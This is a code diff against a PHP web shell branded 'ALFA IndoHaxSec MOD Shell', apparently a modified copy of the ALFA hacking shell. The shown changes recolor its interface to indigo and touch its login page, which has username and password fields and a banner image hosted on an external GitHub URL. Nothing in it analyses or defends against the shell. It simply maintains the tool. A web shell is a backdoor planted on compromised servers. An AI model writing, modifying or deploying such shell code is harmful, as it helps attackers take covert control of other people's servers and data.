@@ -311,7 +311,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"minimize_editor_background" => array(
-			"key_color" => "#FFB6C1",
+			"key_color" => "#4B0082",
 			"multi_selector" => array(
 				".minimized-wrapper" => "background-color: {color};",
 			)
@@ -491,8 +491,8 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 				".up_bar" => "background-color: {color};",
 			)
 		),
-		"mysql_tables" => "#00FF00",
-		"mysql_table_count" => "#67ABDF",
+		"mysql_tables" => "#4B0082",
+		"mysql_table_count" => "#4B0082",
 		"copyright" => "#dfff00",
 		"scrollbar" => array(
 			"key_color" => "#1e82b5",
@@ -535,14 +535,14 @@ body{background: indigo;}
 <center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/NFHURO997XXD/XXX666XXX/refs/heads/main/photo_6154659260559117508_c-removebg-preview.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
-<tr><td bgcolor="indigo"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="purple" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA IndoHaxSec MOD Shell'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
-<tr><td bgcolor="indigo" style="padding:5">
+<tr><td bgcolor="#4B0082"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="purple" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA IndoHaxSec MOD Shell'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
+<tr><td bgcolor="#4B0082" style="padding:5">
 <form method="post">
 <input type="hidden" name="action" value="login">
 <input type="hidden" name="hide" value="">
 <center><table>
-<tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" placeholder="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
-<tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="password" placeholder="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
+<tr><td><font color="#4B0082" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" placeholder="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
+<tr><td><font color="#4B0082" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="password" placeholder="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
 <tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Login"></font></td></tr></table>
 </div><br /></center>';
 exit;
